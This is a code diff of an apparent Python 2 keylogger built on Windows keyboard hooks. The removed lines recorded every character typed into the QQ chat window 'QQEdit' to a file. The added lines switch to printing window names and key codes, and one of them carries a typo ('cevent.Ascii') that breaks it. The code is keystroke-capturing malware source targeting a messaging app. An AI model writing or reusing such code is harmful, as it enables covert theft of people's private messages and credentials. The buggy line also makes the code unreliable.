@@ -24,16 +24,14 @@ def onMouseEvent(event):
 def onKeyboardEvent(event):
     # 监听键盘事件
     global key_word
-    key_name = chr(event.Ascii)
-    window_name = event.WindowName
+    #key_name = chr(event.Ascii)
+    #window_name = event.WindowName
     #print "MessageName:", event.MessageName
     #print "Message:", event.Message
-
     #print "Time:", event.Time
     #print "Window:", event.Window
     #print "WindowName:", event.WindowName
     #print "Ascii:", event.Ascii, chr(event.Ascii)
-    #print "Ascii:", chr(event.Ascii)
     #print "Key:", event.Key
     #print "KeyID:", event.KeyID
     #print "ScanCode:", event.ScanCode
@@ -44,10 +42,16 @@ def onKeyboardEvent(event):
     #print "---"
     # 同鼠标事件监听函数的返回值
     #global key_word
-    if window_name == "QQEdit":
-        key_word.write(chr(event.Ascii))
-        #key_word.write(window_name)
-        key_word.flush()
+    #key_word.write(chr(event.Ascii))
+    # key_word.write(window_name)
+    #key_word.flush()
+    print event.WindowName, event.KeyID, cevent.Ascii
+    #if event.WindowName == "QQEdit":
+    #    if event.Injected == 0 :
+    #    #key_word.write(chr(event.Ascii))
+    #    #key_word.write(window_name)
+    #    #key_word.flush()
+    #        print event.WindowName,event.KeyID
     return True
 
 def main():
